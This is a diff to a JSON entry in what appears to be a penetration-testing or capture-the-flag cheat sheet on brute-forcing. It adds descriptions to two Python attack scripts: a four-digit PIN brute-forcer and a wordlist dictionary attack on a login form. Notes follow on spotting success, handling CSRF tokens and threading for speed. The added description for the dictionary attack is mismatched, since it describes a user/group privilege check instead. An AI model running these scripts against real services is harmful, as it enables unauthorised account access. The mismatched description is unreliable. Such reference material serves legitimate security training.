@@ -27,11 +27,13 @@
   "variations": [
     {
       "label": "Numeric PIN brute (0000-9999)",
-      "command": "import requests\nfor pin in range(10000):\n    p=f'{pin:04d}'\n    r=requests.get(f'http://<ip>:<port>/pin?pin={p}')\n    if r.ok and 'flag' in r.text:\n        print('FOUND',p,r.text); break"
+      "command": "import requests\nfor pin in range(10000):\n    p=f'{pin:04d}'\n    r=requests.get(f'http://<ip>:<port>/pin?pin={p}')\n    if r.ok and 'flag' in r.text:\n        print('FOUND',p,r.text); break",
+      "description": "Numeric PIN brute (0000-9999). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Dictionary attack (POST)",
-      "command": "import requests\nfor pw in open('<wordlist>').read().split():\n    r=requests.post(f'http://<ip>:<port>/login', data={'password':pw})\n    if 'Invalid' not in r.text:\n        print('FOUND',pw); break"
+      "command": "import requests\nfor pw in open('<wordlist>').read().split():\n    r=requests.post(f'http://<ip>:<port>/login', data={'password':pw})\n    if 'Invalid' not in r.text:\n        print('FOUND',pw); break",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     }
   ],
   "notes": "Success detection is the hard part - baseline a known-bad response first, then diff on status code, Content-Length, or a marker string ('Invalid'/'flag'). Add a session/CSRF-token fetch before each attempt if the app requires one. Thread with concurrent.futures for speed, but watch rate limits/lockout.",
